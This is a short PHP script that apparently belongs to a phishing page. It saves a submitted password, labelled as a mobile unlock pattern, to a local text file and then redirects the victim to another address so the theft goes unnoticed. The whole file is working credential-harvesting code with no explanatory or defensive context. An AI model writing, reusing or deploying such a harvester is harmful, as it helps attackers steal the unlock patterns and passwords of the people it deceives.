<?php

file_put_contents("pattern.txt", "Mobile Pattern: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: redirecturl');
exit();
